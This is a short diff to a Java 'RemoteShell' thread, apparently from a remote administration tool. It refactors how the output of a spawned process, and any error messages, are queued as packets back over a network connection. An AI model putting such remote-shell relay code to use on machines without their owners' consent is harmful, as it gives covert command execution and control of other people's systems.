@@ -24,13 +24,13 @@ public class RemoteShell extends Thread {
 			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			while ((line = input.readLine()) != null) {
 				if (!line.trim().equals("")) {
-					Connection.addToSendQueue(new Packet21RemoteShell(line));
+					Connection.instance.addToSendQueue(new Packet21RemoteShell(line));
 				}
 			}
 			input.close();
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			Connection.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			Connection.instance.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 		}
 	}
 	
